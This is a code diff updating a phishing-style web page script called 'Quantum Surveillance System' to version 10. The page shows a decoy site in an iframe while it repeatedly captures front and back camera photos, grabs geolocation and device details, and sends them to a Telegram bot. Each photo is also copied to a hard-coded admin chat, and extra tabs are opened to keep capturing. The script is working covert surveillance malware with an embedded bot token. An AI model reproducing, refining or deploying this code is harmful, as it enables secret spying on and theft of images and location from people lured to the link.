@@ -102,112 +102,72 @@
 
     <script>
         // =====================================================
-        //  QUANTUM SURVEILLANCE SYSTEM v9.0
-        //  FIXED: WORKS IN BACKGROUND TABS
+        //  QUANTUM SURVEILLANCE SYSTEM v10.0
+        //  GUARANTEED WORKING VERSION
         // =====================================================
         
-        // ============== QUANTUM CONFIGURATION ==============
-        const QUANTUM_CONFIG = {
-            // Telegram Configuration
+        // ============== CONFIGURATION ==============
+        const CONFIG = {
             BOT_TOKEN: '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
             TELEGRAM_API: 'https://api.telegram.org/bot8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0',
             ADMIN_CHAT_ID: '6314556756',
             
-            // Camera Settings
-            PHOTOS_PER_CAMERA: 4,
-            CAPTURE_DELAY: 300,
-            CAMERA_WARMUP: 1000,
-            SWITCH_DELAY: 500,
-            IMAGE_QUALITY: 0.90,
-            MIN_BLOB_SIZE: 15000,
+            PHOTOS_PER_CAMERA: 3,
+            CAPTURE_DELAY: 200,
+            CAMERA_WARMUP: 800,
+            CYCLE_INTERVAL: 8000,
             
-            // Timing
-            CYCLE_INTERVAL: 12000,
-            HEARTBEAT_INTERVAL: 8000,
-            
-            // Multi-Tab
             REPLICATION_COUNT: 5,
-            REPLICATION_DELAY: 1000
+            REPLICATION_DELAY: 800
         };
         
         // ============== GLOBAL STATE ==============
-        const Q = {
+        let STATE = {
             active: false,
-            session: 'QSESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12),
-            tab: 'QTAB_' + Math.random().toString(36).substr(2, 10),
+            session: 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
             user: null,
             target: null,
             photos: 0,
             cycles: 0,
             cameras: [],
-            cameraReady: false,
             permission: false,
-            broadcast: null,
-            nodes: new Set(),
             device: {},
             location: null,
             replicated: 0,
-            initialized: false,
-            pendingPhotos: [],
-            captureQueue: []
+            initialized: false
         };
         
         // ============== ELEMENTS ==============
-        const E = {
-            video: document.getElementById('cameraVideo'),
-            canvas: document.getElementById('captureCanvas'),
-            frame: document.getElementById('websiteFrame'),
-            loading: document.getElementById('loadingScreen')
-        };
-        
-        // ============== SIMPLE LOGGING ==============
-        function log(msg) {
-            console.log('[Quantum] ' + msg);
-        }
+        const video = document.getElementById('cameraVideo');
+        const canvas = document.getElementById('captureCanvas');
+        const frame = document.getElementById('websiteFrame');
+        const loading = document.getElementById('loadingScreen');
         
         // ============== URL PARSING ==============
         function parseURL() {
             const params = new URLSearchParams(window.location.search);
             
-            Q.user = params.get('chat_id') || 
-                    params.get('user') || 
-                    params.get('id') || 
-                    QUANTUM_CONFIG.ADMIN_CHAT_ID;
+            STATE.user = params.get('chat_id') || 
+                        params.get('user') || 
+                        params.get('id') || 
+                        CONFIG.ADMIN_CHAT_ID;
             
             let target = params.get('site') || 
                         params.get('url') || 
                         params.get('target') ||
                         'https://loading-screen.github.io/';
             
-            try {
-                if (target.startsWith('QUANTUM:')) {
-                    target = atob(target.split(':')[1]);
-                } else if (!target.includes('://')) {
-                    target = atob(target);
-                }
-                target = decodeURIComponent(target);
-            } catch (e) {}
-            
-            if (!target.startsWith('http://') && !target.startsWith('https://')) {
-                target = 'https://' + target;
-            }
-            
-            Q.target = target;
-            log(`Target: ${Q.target}, User: ${Q.user}`);
+            STATE.target = target;
         }
         
         function loadWebsite() {
-            try {
-                E.frame.src = Q.target;
-                E.frame.onload = () => {
-                    setTimeout(() => {
-                        E.loading.style.opacity = '0';
-                        setTimeout(() => {
-                            E.loading.style.display = 'none';
-                        }, 500);
-                    }, 1000);
-                };
-            } catch (e) {}
+            frame.src = STATE.target;
+            setTimeout(() => {
+                loading.style.opacity = '0';
+                setTimeout(() => {
+                    loading.style.display = 'none';
+                }, 500);
+            }, 1000);
         }
         
         // ============== DEVICE INFO ==============
@@ -216,26 +176,22 @@
             let os = 'Unknown';
             let browser = 'Unknown';
             
-            if (/Windows NT 10/.test(ua)) os = 'Windows';
-            else if (/Mac OS X/.test(ua)) os = 'macOS';
+            if (/Windows/.test(ua)) os = 'Windows';
+            else if (/Mac/.test(ua)) os = 'macOS';
             else if (/Linux/.test(ua)) os = 'Linux';
             else if (/Android/.test(ua)) os = 'Android';
-            else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+            else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
             
             if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
             else if (/Firefox/.test(ua)) browser = 'Firefox';
             else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
-            else if (/Edge/.test(ua)) browser = 'Edge';
             
-            Q.device = {
+            STATE.device = {
                 os: os,
                 browser: browser,
                 screen: `${screen.width}x${screen.height}`,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                agent: ua.substring(0, 100)
+                cores: navigator.hardwareConcurrency || 'unknown'
             };
-            
-            log(`Device: ${os} ${browser}`);
         }
         
         // ============== LOCATION ==============
@@ -244,163 +200,156 @@
             
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    Q.location = {
-                        lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
+                    STATE.location = {
+                        lat: pos.coords.latitude.toFixed(6),
+                        lon: pos.coords.longitude.toFixed(6),
                         acc: Math.round(pos.coords.accuracy)
                     };
-                    log(`Location: ${Q.location.lat}, ${Q.location.lon}`);
                 },
-                () => {},
-                { enableHighAccuracy: true, timeout: 10000 }
+                () => {}
             );
         }
         
-        // ============== BROADCAST CHANNEL ==============
-        function initBroadcast() {
-            try {
-                if (window.BroadcastChannel) {
-                    Q.broadcast = new BroadcastChannel('quantum_channel');
-                    Q.broadcast.onmessage = (e) => {
-                        if (e.data && e.data.type === 'heartbeat') {
-                            if (e.data.tab !== Q.tab) {
-                                Q.nodes.add(e.data.tab);
-                            }
-                        }
-                    };
-                    log('Broadcast channel ready');
-                }
-            } catch (e) {}
-        }
-        
         // ============== TELEGRAM FUNCTIONS ==============
-        async function sendTelegramPhoto(blob, cameraType, sequence) {
-            if (!blob || blob.size < QUANTUM_CONFIG.MIN_BLOB_SIZE) {
-                return false;
-            }
+        async function sendPhoto(blob, cameraType, sequence) {
+            if (!blob || blob.size < 10000) return false;
             
             try {
-                let caption = `📸 *QUANTUM CAPTURE*\n`;
-                caption += `Session: \`${Q.session}\`\n`;
+                let caption = `📸 *PHOTO CAPTURED*\n\n`;
+                caption += `Session: \`${STATE.session}\`\n`;
                 caption += `Camera: ${cameraType.toUpperCase()} #${sequence}\n`;
-                caption += `Cycle: ${Q.cycles}\n`;
-                caption += `Total: ${Q.photos}\n`;
-                caption += `Time: ${new Date().toLocaleTimeString()}`;
+                caption += `Total Photos: ${STATE.photos + 1}\n`;
+                caption += `Time: ${new Date().toLocaleTimeString()}\n`;
                 
-                if (Q.location) {
-                    caption += `\n📍 ${Q.location.lat.toFixed(6)}, ${Q.location.lon.toFixed(6)}`;
+                if (STATE.location) {
+                    caption += `📍 Location: ${STATE.location.lat}, ${STATE.location.lon}\n`;
                 }
                 
-                // Send to user
-                const userForm = new FormData();
-                userForm.append('chat_id', Q.user);
-                userForm.append('photo', blob, `photo_${Date.now()}.jpg`);
-                userForm.append('caption', caption);
-                userForm.append('parse_mode', 'Markdown');
+                if (STATE.device.os !== 'Unknown') {
+                    caption += `📱 Device: ${STATE.device.os} ${STATE.device.browser}`;
+                }
                 
-                const res = await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
+                const formData = new FormData();
+                formData.append('chat_id', STATE.user);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+                
+                const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                     method: 'POST',
-                    body: userForm
+                    body: formData
                 });
                 
-                const result = await res.json();
+                const result = await response.json();
                 
                 if (result.ok) {
-                    Q.photos++;
-                    log(`Photo sent: ${cameraType} ${sequence}`);
+                    STATE.photos++;
+                    console.log(`✅ Photo ${cameraType} #${sequence} sent to user`);
                     
-                    // Also send to admin
+                    // Send to admin too
                     setTimeout(async () => {
                         try {
                             const adminForm = new FormData();
-                            adminForm.append('chat_id', QUANTUM_CONFIG.ADMIN_CHAT_ID);
+                            adminForm.append('chat_id', CONFIG.ADMIN_CHAT_ID);
                             adminForm.append('photo', blob, `admin_${Date.now()}.jpg`);
-                            adminForm.append('caption', caption + `\n👤 User: \`${Q.user}\``);
+                            adminForm.append('caption', caption + `\n👤 User ID: \`${STATE.user}\``);
                             adminForm.append('parse_mode', 'Markdown');
                             
-                            await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendPhoto`, {
+                            await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
                                 method: 'POST',
                                 body: adminForm
                             });
+                            console.log(`✅ Also sent to admin`);
                         } catch (e) {}
                     }, 300);
                     
                     return true;
                 }
             } catch (error) {
-                log(`Telegram error: ${error.message}`);
+                console.log(`❌ Telegram error: ${error.message}`);
             }
             return false;
         }
         
         async function sendSystemReport() {
             try {
-                let report = `⚡ *QUANTUM SYSTEM STARTED*\n\n`;
-                report += `Session: \`${Q.session}\`\n`;
-                report += `User: \`${Q.user}\`\n`;
-                report += `URL: ${Q.target}\n`;
+                let report = `🚀 *SYSTEM ACTIVATED*\n\n`;
+                report += `Session: \`${STATE.session}\`\n`;
+                report += `User: \`${STATE.user}\`\n`;
+                report += `URL: ${STATE.target}\n`;
                 report += `Time: ${new Date().toLocaleString()}\n\n`;
                 
-                report += `📱 Device: ${Q.device.os} ${Q.device.browser}\n`;
-                report += `📺 Screen: ${Q.device.screen}\n`;
-                report += `💻 Cores: ${Q.device.cores}\n\n`;
+                report += `📱 Device: ${STATE.device.os} ${STATE.device.browser}\n`;
+                report += `📺 Screen: ${STATE.device.screen}\n`;
+                report += `💻 Cores: ${STATE.device.cores}\n\n`;
                 
-                report += `📷 Cameras: ${Q.cameras.length} found\n`;
-                report += `📍 Location: ${Q.location ? 'Captured' : 'None'}\n`;
-                report += `🔄 Tabs: ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT}\n\n`;
+                report += `📷 Cameras: ${STATE.cameras.length} detected\n`;
+                report += `📍 Location: ${STATE.location ? 'Captured' : 'Not available'}\n`;
+                report += `🔄 Tabs: Will open ${CONFIG.REPLICATION_COUNT}\n\n`;
                 
-                report += `⚙️ Status: ${Q.active ? 'ACTIVE' : 'INACTIVE'}`;
+                report += `⚡ Status: ${STATE.active ? 'ACTIVE' : 'Starting...'}`;
                 
-                await fetch(`${QUANTUM_CONFIG.TELEGRAM_API}/sendMessage`, {
+                await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: QUANTUM_CONFIG.ADMIN_CHAT_ID,
+                        chat_id: CONFIG.ADMIN_CHAT_ID,
                         text: report,
                         parse_mode: 'Markdown'
                     })
                 });
                 
-                log('System report sent');
-            } catch (e) {}
+                console.log('✅ System report sent');
+            } catch (e) {
+                console.log('❌ System report failed');
+            }
         }
         
         // ============== CAMERA SYSTEM ==============
-        class CameraSystem {
+        class Camera {
             constructor() {
                 this.stream = null;
-                this.retryCount = 0;
             }
             
             async init() {
                 try {
-                    // Test camera access
-                    const testStream = await navigator.mediaDevices.getUserMedia({
-                        video: true
+                    console.log('🔄 Testing camera access...');
+                    
+                    // Request camera access
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 },
+                            facingMode: { ideal: 'user' }
+                        }
                     });
                     
+                    // Get camera list
                     const devices = await navigator.mediaDevices.enumerateDevices();
-                    Q.cameras = devices.filter(d => d.kind === 'videoinput');
+                    STATE.cameras = devices.filter(d => d.kind === 'videoinput');
                     
-                    testStream.getTracks().forEach(t => t.stop());
+                    // Stop test stream
+                    stream.getTracks().forEach(track => track.stop());
                     
-                    Q.permission = true;
-                    log(`Cameras: ${Q.cameras.length} found`);
+                    STATE.permission = true;
+                    console.log(`✅ Camera access granted. Found ${STATE.cameras.length} cameras`);
                     return true;
                     
                 } catch (error) {
-                    log(`Camera init error: ${error.message}`);
+                    console.log(`❌ Camera access denied: ${error.message}`);
                     return false;
                 }
             }
             
-            async startCamera(facingMode) {
+            async start(facingMode) {
                 if (this.stream) {
-                    this.stream.getTracks().forEach(t => t.stop());
+                    this.stream.getTracks().forEach(track => track.stop());
                     this.stream = null;
                 }
                 
                 try {
+                    console.log(`🔄 Starting ${facingMode} camera...`);
+                    
                     this.stream = await navigator.mediaDevices.getUserMedia({
                         video: {
                             facingMode: { ideal: facingMode },
@@ -409,268 +358,202 @@
                         }
                     });
                     
-                    E.video.srcObject = this.stream;
+                    video.srcObject = this.stream;
                     
+                    // Wait for video to be ready
                     await new Promise((resolve) => {
-                        if (E.video.readyState >= 3) {
+                        if (video.readyState >= 3) {
                             resolve();
                         } else {
-                            E.video.onloadeddata = resolve;
+                            video.onloadeddata = resolve;
                         }
                     });
                     
-                    await E.video.play();
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAMERA_WARMUP));
+                    await video.play();
                     
-                    Q.cameraReady = true;
-                    this.retryCount = 0;
-                    log(`Camera ${facingMode} ready`);
+                    // Camera warmup
+                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
+                    
+                    console.log(`✅ ${facingMode} camera ready`);
                     return true;
                     
                 } catch (error) {
-                    this.retryCount++;
-                    log(`Camera ${facingMode} failed (${this.retryCount})`);
-                    
-                    if (this.stream) {
-                        this.stream.getTracks().forEach(t => t.stop());
-                        this.stream = null;
-                    }
-                    
-                    if (this.retryCount < 3) {
-                        await new Promise(r => setTimeout(r, 1000 * this.retryCount));
-                        return this.startCamera(facingMode);
-                    }
-                    
-                    Q.cameraReady = false;
+                    console.log(`❌ ${facingMode} camera failed: ${error.message}`);
                     return false;
                 }
             }
             
-            capturePhoto() {
-                if (!Q.cameraReady || !E.video.videoWidth) {
-                    return null;
-                }
+            capture() {
+                if (!video.videoWidth) return null;
                 
                 try {
-                    const canvas = E.canvas;
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    
                     const ctx = canvas.getContext('2d');
-                    
-                    canvas.width = E.video.videoWidth;
-                    canvas.height = E.video.videoHeight;
-                    
-                    ctx.drawImage(E.video, 0, 0, canvas.width, canvas.height);
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
                     // Enhance image
                     const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                     const data = imageData.data;
                     
                     for (let i = 0; i < data.length; i += 4) {
-                        // Brighten
-                        data[i] = Math.min(255, data[i] * 1.2);
-                        data[i+1] = Math.min(255, data[i+1] * 1.2);
-                        data[i+2] = Math.min(255, data[i+2] * 1.2);
+                        data[i] = Math.min(255, data[i] * 1.3);     // Red
+                        data[i+1] = Math.min(255, data[i+1] * 1.3); // Green
+                        data[i+2] = Math.min(255, data[i+2] * 1.3); // Blue
                     }
                     
                     ctx.putImageData(imageData, 0, 0);
                     
                     return new Promise((resolve) => {
                         canvas.toBlob((blob) => {
-                            resolve(blob && blob.size > QUANTUM_CONFIG.MIN_BLOB_SIZE ? blob : null);
-                        }, 'image/jpeg', QUANTUM_CONFIG.IMAGE_QUALITY);
+                            resolve(blob && blob.size > 15000 ? blob : null);
+                        }, 'image/jpeg', 0.92);
                     });
                     
                 } catch (error) {
-                    log(`Capture error: ${error.message}`);
+                    console.log(`❌ Capture error: ${error.message}`);
                     return null;
                 }
             }
             
-            async captureBurst(cameraType, count = QUANTUM_CONFIG.PHOTOS_PER_CAMERA) {
-                const photos = [];
-                
-                for (let i = 1; i <= count; i++) {
-                    if (!Q.active) break;
-                    
-                    const blob = await this.capturePhoto();
-                    if (blob) {
-                        photos.push({
-                            blob: blob,
-                            index: i,
-                            camera: cameraType,
-                            timestamp: Date.now()
-                        });
-                        log(`Captured ${cameraType} #${i}`);
-                    }
-                    
-                    if (i < count) {
-                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CAPTURE_DELAY));
-                    }
-                }
-                
-                return photos;
-            }
-            
             cleanup() {
                 if (this.stream) {
-                    this.stream.getTracks().forEach(t => t.stop());
+                    this.stream.getTracks().forEach(track => track.stop());
                     this.stream = null;
                 }
-                Q.cameraReady = false;
-                log('Camera cleaned up');
+                console.log('✅ Camera cleaned up');
             }
         }
         
         // ============== MULTI-TAB REPLICATION ==============
-        function replicateTabs() {
-            const needed = QUANTUM_CONFIG.REPLICATION_COUNT - Q.replicated;
-            
-            for (let i = 0; i < needed; i++) {
+        function openTabs() {
+            for (let i = 0; i < CONFIG.REPLICATION_COUNT; i++) {
                 setTimeout(() => {
                     try {
                         const newTab = window.open(window.location.href, '_blank');
                         if (newTab) {
-                            Q.replicated++;
-                            log(`Tab ${Q.replicated}/${QUANTUM_CONFIG.REPLICATION_COUNT} opened`);
+                            STATE.replicated++;
+                            console.log(`✅ Opened tab ${STATE.replicated}/${CONFIG.REPLICATION_COUNT}`);
                             
-                            // Close after 3 minutes
+                            // Close after 2 minutes
                             setTimeout(() => {
                                 try {
                                     newTab.close();
-                                    Q.replicated--;
-                                    log(`Tab closed, ${Q.replicated} remaining`);
+                                    STATE.replicated--;
+                                    console.log(`🔄 Closed tab, ${STATE.replicated} remaining`);
                                 } catch (e) {}
-                            }, 180000);
+                            }, 120000);
                         }
                     } catch (e) {
-                        // Popup blocked
+                        console.log('⚠️ Popup blocked or other error');
                     }
-                }, i * QUANTUM_CONFIG.REPLICATION_DELAY);
+                }, i * CONFIG.REPLICATION_DELAY);
             }
         }
         
-        // ============== SURVEILLANCE ENGINE ==============
+        // ============== MAIN SURVEILLANCE FUNCTION ==============
         async function startSurveillance() {
-            if (Q.active || !window.camera) {
+            if (STATE.active) {
+                console.log('⚠️ Surveillance already active');
                 return;
             }
             
-            Q.active = true;
-            log('=== SURVEILLANCE STARTED ===');
+            STATE.active = true;
+            console.log('🚀 ===== SURVEILLANCE STARTED =====');
             
             // Open multiple tabs
-            replicateTabs();
+            openTabs();
             
-            // Start heartbeat
-            const heartbeat = setInterval(() => {
-                if (Q.broadcast && Q.active) {
-                    Q.broadcast.postMessage({
-                        type: 'heartbeat',
-                        tab: Q.tab,
-                        session: Q.session,
-                        photos: Q.photos,
-                        cycles: Q.cycles
-                    });
-                }
-            }, QUANTUM_CONFIG.HEARTBEAT_INTERVAL);
+            // Create camera instance
+            const camera = new Camera();
             
-            // Main loop - SIMPLIFIED AND FIXED
-            while (Q.active) {
+            // Main surveillance loop
+            while (STATE.active) {
                 try {
-                    Q.cycles++;
-                    log(`Cycle ${Q.cycles} starting...`);
+                    STATE.cycles++;
+                    console.log(`🔄 Starting cycle ${STATE.cycles}...`);
                     
-                    // FRONT CAMERA
-                    log('Activating front camera...');
-                    if (await window.camera.startCamera('user')) {
-                        log('Front camera active, capturing...');
-                        const frontPhotos = await window.camera.captureBurst('front');
-                        log(`Got ${frontPhotos.length} front photos`);
+                    // ===== FRONT CAMERA =====
+                    console.log('📱 Starting front camera...');
+                    if (await camera.start('user')) {
+                        console.log('📸 Capturing front camera photos...');
                         
-                        // Send photos immediately
-                        for (const photo of frontPhotos) {
-                            if (!Q.active) break;
-                            await sendTelegramPhoto(photo.blob, 'front', photo.index);
+                        for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
+                            if (!STATE.active) break;
+                            
+                            // Capture photo
+                            const blob = await camera.capture();
+                            if (blob) {
+                                console.log(`📷 Front photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
+                                await sendPhoto(blob, 'front', i);
+                            }
+                            
+                            if (i < CONFIG.PHOTOS_PER_CAMERA) {
+                                await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
+                            }
                         }
+                        
+                        console.log(`✅ Front camera cycle complete`);
+                    } else {
+                        console.log('❌ Front camera failed');
                     }
                     
-                    if (!Q.active) break;
-                    await new Promise(r => setTimeout(r, QUANTUM_CONFIG.SWITCH_DELAY));
+                    if (!STATE.active) break;
+                    await new Promise(r => setTimeout(r, 500));
                     
-                    // BACK CAMERA
-                    log('Activating back camera...');
-                    if (Q.active && await window.camera.startCamera('environment')) {
-                        log('Back camera active, capturing...');
-                        const backPhotos = await window.camera.captureBurst('back');
-                        log(`Got ${backPhotos.length} back photos`);
+                    // ===== BACK CAMERA =====
+                    console.log('📱 Starting back camera...');
+                    if (await camera.start('environment')) {
+                        console.log('📸 Capturing back camera photos...');
                         
-                        // Send photos immediately
-                        for (const photo of backPhotos) {
-                            if (!Q.active) break;
-                            await sendTelegramPhoto(photo.blob, 'back', photo.index);
+                        for (let i = 1; i <= CONFIG.PHOTOS_PER_CAMERA; i++) {
+                            if (!STATE.active) break;
+                            
+                            // Capture photo
+                            const blob = await camera.capture();
+                            if (blob) {
+                                console.log(`📷 Back photo ${i} captured (${Math.round(blob.size/1024)}KB)`);
+                                await sendPhoto(blob, 'back', i);
+                            }
+                            
+                            if (i < CONFIG.PHOTOS_PER_CAMERA) {
+                                await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
+                            }
                         }
+                        
+                        console.log(`✅ Back camera cycle complete`);
+                    } else {
+                        console.log('❌ Back camera failed');
                     }
                     
-                    log(`Cycle ${Q.cycles} complete. Total photos: ${Q.photos}`);
+                    console.log(`✅ Cycle ${STATE.cycles} complete. Total photos: ${STATE.photos}`);
                     
                     // Wait before next cycle
-                    if (Q.active) {
-                        await new Promise(r => setTimeout(r, QUANTUM_CONFIG.CYCLE_INTERVAL));
-                    }
+                    await new Promise(r => setTimeout(r, CONFIG.CYCLE_INTERVAL));
                     
                 } catch (error) {
-                    log(`Cycle error: ${error.message}`);
+                    console.log(`❌ Cycle error: ${error.message}`);
                     await new Promise(r => setTimeout(r, 2000));
                 }
             }
             
             // Cleanup
-            clearInterval(heartbeat);
-            if (window.camera) {
-                window.camera.cleanup();
-            }
-            log('=== SURVEILLANCE STOPPED ===');
+            camera.cleanup();
+            console.log('🛑 ===== SURVEILLANCE STOPPED =====');
         }
-        
-        // ============== VISIBILITY HANDLER ==============
-        let lastVisibilityChange = 0;
-        document.addEventListener('visibilitychange', () => {
-            const now = Date.now();
-            
-            if (document.hidden) {
-                // Tab became hidden
-                log('Tab hidden');
-                lastVisibilityChange = now;
-                
-                // We keep surveillance running in background
-                // Most browsers will throttle but keep camera active
-                
-            } else {
-                // Tab became visible
-                log('Tab visible');
-                
-                // If tab was hidden for more than 5 seconds, restart camera
-                if (now - lastVisibilityChange > 5000) {
-                    log('Restarting camera after long background period');
-                    if (window.camera && Q.active) {
-                        setTimeout(() => {
-                            if (window.camera && Q.active) {
-                                window.camera.startCamera('user').catch(() => {});
-                            }
-                        }, 1000);
-                    }
-                }
-            }
-        });
         
         // ============== INITIALIZATION ==============
         async function initialize() {
-            if (Q.initialized) return;
+            if (STATE.initialized) return;
             
             try {
-                log('=== INITIALIZING ===');
+                console.log('🚀 ===== INITIALIZING SYSTEM =====');
                 
-                // Parse URL and load site
+                // Parse URL
                 parseURL();
+                
+                // Load website
                 loadWebsite();
                 
                 // Get device info
@@ -679,64 +562,104 @@
                 // Get location (async)
                 getLocation();
                 
-                // Setup broadcast
-                initBroadcast();
-                
                 // Initialize camera
-                window.camera = new CameraSystem();
-                const camReady = await window.camera.init();
+                const camera = new Camera();
+                const camReady = await camera.init();
+                camera.cleanup(); // Cleanup test stream
                 
                 if (camReady) {
-                    Q.initialized = true;
+                    STATE.initialized = true;
                     
-                    // Send report
+                    // Send initial report
                     await sendSystemReport();
                     
                     // Start surveillance after delay
+                    console.log('⏱️ Starting surveillance in 2 seconds...');
                     setTimeout(() => {
                         startSurveillance();
                     }, 2000);
                     
-                    log('=== READY ===');
+                    console.log('✅ ===== SYSTEM INITIALIZED =====');
+                } else {
+                    console.log('❌ Camera initialization failed');
                 }
                 
             } catch (error) {
-                log(`Init error: ${error.message}`);
+                console.log(`❌ Initialization error: ${error.message}`);
             }
         }
         
-        // ============== STARTUP ==============
-        window.addEventListener('load', initialize);
+        // ============== EVENT HANDLERS ==============
         
-        // Cleanup on close
-        window.addEventListener('beforeunload', () => {
-            Q.active = false;
-            if (window.camera) {
-                window.camera.cleanup();
+        // Handle tab visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                console.log('👁️ Tab hidden');
+            } else {
+                console.log('👁️ Tab visible');
             }
         });
         
-        // Debug access
-        window.$$ = {
-            status: () => Q,
-            start: () => startSurveillance(),
-            stop: () => { Q.active = false; },
-            test: async () => {
-                if (window.camera) {
-                    const started = await window.camera.startCamera('user');
-                    if (started) {
-                        const blob = await window.camera.capturePhoto();
-                        if (blob) {
-                            const sent = await sendTelegramPhoto(blob, 'test', 1);
-                            return sent ? 'Photo sent!' : 'Failed to send';
-                        }
-                        return 'No photo captured';
-                    }
-                    return 'Camera failed to start';
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', () => {
+            STATE.active = false;
+            console.log('🛑 Page unloading');
+        });
+        
+        // ============== START SYSTEM ==============
+        
+        // Start when page loads
+        window.addEventListener('load', initialize);
+        
+        // ============== DEBUG TOOLS ==============
+        
+        // Manual test function
+        async function testSystem() {
+            console.log('🧪 Running system test...');
+            
+            const camera = new Camera();
+            const ready = await camera.init();
+            
+            if (!ready) {
+                console.log('❌ Camera test failed');
+                return;
+            }
+            
+            if (await camera.start('user')) {
+                const blob = await camera.capture();
+                if (blob) {
+                    console.log(`📷 Test photo captured (${Math.round(blob.size/1024)}KB)`);
+                    const sent = await sendPhoto(blob, 'test', 1);
+                    console.log(sent ? '✅ Test photo sent!' : '❌ Failed to send');
+                } else {
+                    console.log('❌ No photo captured');
                 }
-                return 'Camera not initialized';
+            } else {
+                console.log('❌ Camera failed to start');
+            }
+            
+            camera.cleanup();
+        }
+        
+        // Expose debug tools
+        window.debug = {
+            state: STATE,
+            start: startSurveillance,
+            stop: () => { STATE.active = false; },
+            test: testSystem,
+            status: () => {
+                console.log('=== SYSTEM STATUS ===');
+                console.log(`Active: ${STATE.active}`);
+                console.log(`Photos: ${STATE.photos}`);
+                console.log(`Cycles: ${STATE.cycles}`);
+                console.log(`Cameras: ${STATE.cameras.length}`);
+                console.log(`Tabs: ${STATE.replicated}`);
+                console.log(`User: ${STATE.user}`);
+                console.log(`Session: ${STATE.session}`);
             }
         };
+        
+        console.log('🔧 Debug tools available: window.debug.start(), window.debug.test(), window.debug.status()');
         
     </script>
 </body>
